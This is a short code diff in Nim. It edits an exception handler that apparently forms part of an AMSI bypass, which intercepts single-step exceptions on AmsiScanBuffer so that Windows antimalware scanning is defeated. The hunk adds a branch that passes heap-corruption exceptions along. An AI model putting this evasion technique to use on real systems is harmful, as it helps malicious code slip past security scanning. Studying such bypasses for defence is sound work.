@@ -1783,6 +1783,11 @@ var AMSI_RESULT_CLEAN = 0
 type pint = ptr int
 
 proc AMSIExceptionHandler(exceptions: PEXCEPTION_POINTERS): LONG {.stdcall} =
+    
+    if (exceptions.ExceptionRecord.ExceptionCode != EXCEPTION_SINGLE_STEP) and (exceptions.ExceptionRecord.ExceptionCode == STATUS_HEAP_CORRUPTION):
+        echo "[+] Exception for STATUS_HEAP_CORRUPTION!"
+        return EXCEPTION_CONTINUE_SEARCH
+    
     if exceptions.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP and exceptions.ExceptionRecord.ExceptionAddress == g_amsiScanBufferPtr:
         when defined(verbose):
             echo "[+] Exception for AmsiScanBuffer!"
